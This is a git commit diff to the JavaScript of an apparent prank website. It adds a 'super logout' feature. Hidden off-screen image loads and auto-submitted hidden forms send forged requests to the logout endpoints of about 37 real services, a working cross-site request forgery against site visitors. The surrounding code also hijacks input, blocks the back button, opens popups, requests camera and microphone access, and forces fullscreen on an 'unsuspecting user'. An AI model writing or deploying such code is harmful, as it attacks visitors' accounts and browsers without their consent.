f7b09285c0fe5112f29017cca0321d21b328d32c
Feross Aboukhadijeh <feross@feross.org>
2017-12-15 15:19:28 -0800

    inline super logout

--- static/index.js
+++ static/index.js
@@ -76,6 +76,46 @@ const VIDEOS = [
   'trolol.mp4'
 ]
 
+const LOGOUT_SITES = {
+  'AOL': ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
+  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
+  'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
+  'Blogger': ['GET', 'https://www.blogger.com/logout.g'],
+  'Delicious': ['GET', 'https://www.delicious.com/logout'], // works!
+  'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
+  'DreamHost': ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
+  'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
+  'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+  'Gandi': ['GET', 'https://www.gandi.net/login/out'],
+  'GitHub': ['GET', 'https://github.com/logout'],
+  'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
+  'Google': ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  'Hulu': ['GET', 'https://secure.hulu.com/logout'],
+  'Instapaper': ['GET', 'https://www.instapaper.com/user/logout'],
+  'Linode': ['GET', 'https://manager.linode.com/session/logout'],
+  'LiveJournal': ['POST', 'https://www.livejournal.com/logout.bml', {'action:killall': '1'}],
+  'MySpace': ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
+  'NetFlix': ['GET', 'https://www.netflix.com/Logout'],
+  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
+  'Newegg': ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
+  'Photobucket': ['GET', 'https://photobucket.com/logout'],
+  'Skype': ['GET', 'https://secure.skype.com/account/logout'],
+  'Slashdot': ['GET', 'https://slashdot.org/my/logout'],
+  'SoundCloud': ['GET', 'https://soundcloud.com/logout'],
+  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
+  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
+  'ThinkGeek': ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
+  'Threadless': ['GET', 'https://www.threadless.com/logout'],
+  'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
+  'Vimeo': ['GET', 'https://vimeo.com/log_out'],
+  'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
+  'Woot': ['GET', 'https://account.woot.com/logout'],
+  'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+  'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+  'YouTube': ['POST', 'http://www.youtube.com', {'action_logout': '1'}]
+}
+
 /**
  * Array to store the child windows spawned by this window.
  */
@@ -85,6 +125,12 @@ const wins = []
  * Count of number of clicks
  */
 let interactionCount = 0
+
+/**
+ * Number of iframes injected into the page for the "super logout" functionality.
+ * See superLogout().
+ */
+let numSuperLogoutIframes = 0
 
 /*
  * Run this code in all windows, *both* child and parent windows.
@@ -107,6 +153,8 @@ function init () {
   registerProtocolHandlers()
 
   interceptUserInput(event => {
+    interactionCount += 1
+
     // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
     event.stopPropagation()
@@ -117,12 +165,12 @@ function init () {
     openWindow()
     requestCameraAndMic()
 
-    if (interactionCount === 0) {
+    // TODO: capture every Command/Cntrl press with an alert
+    console.log(event.key)
+    if (interactionCount === 1) {
       showAlert()
       enableFullscreen()
     }
-
-    interactionCount += 1
   })
 }
 
@@ -140,13 +188,16 @@ function initChildWindow () {
  */
 function initParentWindow () {
   showHelloMessage()
-  superLogout()
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
 
   interceptUserInput(event => {
-    startAlertInterval()
+    if (interactionCount === 1) {
+      startAlertInterval()
+      superLogout()
+      removeHelloMessage()
+    }
   })
 }
 
@@ -277,9 +328,9 @@ function openWindow () {
 
   // New windows may be blocked by the popup blocker
   if (!win) return
-
-  if (wins.length === 1) setupSearchWindow(win)
   wins.push(win)
+
+  if (wins.length === 2) setupSearchWindow(win)
 }
 
 /**
@@ -336,10 +387,21 @@ function onCloseWindow (win) {
   if (i >= 0) wins.splice(i, 1)
 }
 
+/**
+ * Show the unsuspecting user a friendly hello message with a cat.
+ */
 function showHelloMessage () {
   const template = document.querySelector('template')
   const clone = document.importNode(template.content, true)
   document.body.appendChild(clone)
+}
+
+/**
+ * Remove the hello message.
+ */
+function removeHelloMessage () {
+  const helloMessage = document.querySelector('.hello-message')
+  helloMessage.remove()
 }
 
 /**
@@ -374,12 +436,77 @@ function enableFullscreen () {
 
 /**
  * Log the user out of top sites they're logged into, including Google.com.
+ * Inspired by https://superlogout.com
  */
 function superLogout () {
-  const logoutIframe = document.createElement('iframe')
-  logoutIframe.src = 'https://superlogout.com'
-  logoutIframe.style = 'width: 1px; height: 1px;'
-  document.body.appendChild(logoutIframe)
+  const hiddenStyle = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
+
+  function cleanup (el, delayCleanup) {
+    if (delayCleanup) {
+      delayCleanup = false
+      return
+    }
+    el.parentNode.removeChild(el)
+  }
+
+  function get (url) {
+    const img = document.createElement('img')
+    img.onload = () => cleanup(img)
+    img.onerror = () => cleanup(img)
+    img.style = hiddenStyle
+    document.body.appendChild(img)
+    img.src = url
+  }
+
+  function post (url, params) {
+    var iframe = document.createElement('iframe')
+    iframe.style = hiddenStyle
+    iframe.name = 'iframe' + numSuperLogoutIframes
+    document.body.appendChild(iframe)
+
+    numSuperLogoutIframes += 1
+
+    const form = document.createElement('form')
+    form.style = hiddenStyle
+
+    let numLoads = 0
+    iframe.onload = iframe.onerror = () => {
+      if (numLoads >= 1) cleanup(iframe)
+      numLoads += 1
+    }
+    form.action = url
+    form.method = 'POST'
+    form.target = iframe.name
+
+    for (const param in params) {
+      if (params.hasOwnProperty(param)) {
+        const input = document.createElement('input')
+        input.type = 'hidden'
+        input.name = param
+        input.value = params[param]
+        form.appendChild(input)
+      }
+    }
+
+    document.body.appendChild(form)
+    form.submit()
+  }
+  for (let name in LOGOUT_SITES) {
+    const method = LOGOUT_SITES[name][0]
+    const url = LOGOUT_SITES[name][1]
+    const params = LOGOUT_SITES[name][2] || {}
+
+    if (method === 'GET') {
+      get(url)
+    } else {
+      post(url, params)
+    }
+
+    const div = document.createElement('div')
+    div.className = 'logout-message'
+    div.innerText = `Logging you out from ${name}...`
+    document.body.appendChild(div)
+  }
 }
 
 /**
